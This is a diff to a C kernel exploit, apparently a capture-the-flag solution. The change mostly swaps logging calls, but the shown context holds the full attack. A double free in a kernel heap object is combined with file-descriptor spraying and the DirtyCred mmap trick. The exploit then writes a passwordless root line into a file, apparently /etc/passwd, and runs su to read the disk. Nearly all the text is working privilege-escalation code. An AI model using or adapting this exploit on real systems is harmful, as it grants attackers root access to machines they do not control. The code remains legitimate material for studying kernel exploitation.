@@ -15,36 +15,34 @@ int main(void)
   int tmp_a;
   int freed_fd = -1;
   void* keap_ptr;
-  char buf[FS_CONTEXT_SLAB_SIZE];
-  bzero(buf, sizeof(buf));
+  char buf[FS_CONTEXT_SLAB_SIZE] = {0};
 
-  puts("[+] Initial setup");
+  lstage("Initial setup");
 
   rlimit_increase(RLIMIT_NOFILE);
-
   // Pin CPU
   pin_cpu(0, 0);
-
   init();
+
+  lstage("START");
 
   // create target file
   tmp_a = SYSCHK(open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
   SYSCHK(close(tmp_a));
 
-  puts("[+] create and free heap allocation for double free later");
+  linfo("create and free heap allocation for double free later");
   keap_ptr = keap_malloc(FS_CONTEXT_SLAB_SIZE, GFP_KERNEL_ACCOUNT);
 
   keap_free(keap_ptr);
-  // spray 
+  // spray
 
   /*******************************
    * DIRTY CRED                  *
    *******************************/
 
-  puts("=======================");
-  puts("[+] Start the main exploit");
+  lstage("Start the main exploit");
 
-  puts("[+] Spray FDs");
+  linfo("Spray FDs");
   int spray_fds[NUM_SPRAY_FDS];
   for(int i =0;i<NUM_SPRAY_FDS;i++){
     spray_fds[i] = open("/tmp/chovid99", O_RDWR); // /tmp/a is a writable file
@@ -54,17 +52,17 @@ int main(void)
     }
   }
 
-  puts("[+] Free one of the FDs via double free keap");
+  linfo("Free one of the FDs via double free keap");
   #ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
-  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
   #endif
   keap_free(keap_ptr);
   // After: 1 fd but pointed chunk is free
 
   // Spray to replace the previously freed chunk
   // Set the lseek to 0x8, so that we can find easily the fd
-  puts("[+] Find the freed FD using lseek");
+  linfo("Find the freed FD using lseek");
   int spray_fds_2[NUM_SPRAY_FDS];
   for (int i = 0; i < NUM_SPRAY_FDS; i++) {
     spray_fds_2[i] = open("/tmp/chovid99", O_RDWR);
@@ -77,14 +75,14 @@ int main(void)
     if (lseek(spray_fds[i], 0 ,SEEK_CUR) == 8) {
       freed_fd = spray_fds[i];
       lseek(freed_fd, 0x0, SEEK_SET);
-      printf("[+] Found freed fd: %d\n", freed_fd);
+      linfo("Found freed fd: %d\n", freed_fd);
       break;
     }
   }
 
   #ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
-  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
   #endif
 
   if (freed_fd == -1) {
@@ -93,7 +91,7 @@ int main(void)
   }
 
   // mmap trick instead of race with write
-  puts("[+] DirtyCred via mmap");
+  lstage("DirtyCred via mmap");
   char *file_mmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
   // After: 3 fd 2 refcount (Because new file)
 
@@ -112,12 +110,12 @@ int main(void)
   // After: 2 fd 1 refcount (but writeable due to mmap)
   #ifdef DEBUG
   keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
-  print_hex(buf, FS_CONTEXT_SLAB_SIZE); 
+  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
   #endif
 
   strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");
-  puts("[+] Finished! Reading Flag");
-  puts("=======================");
+  lstage("Finished! Reading Flag");
   system("su -c 'cat /dev/sda'");
+
   return 0;
 }
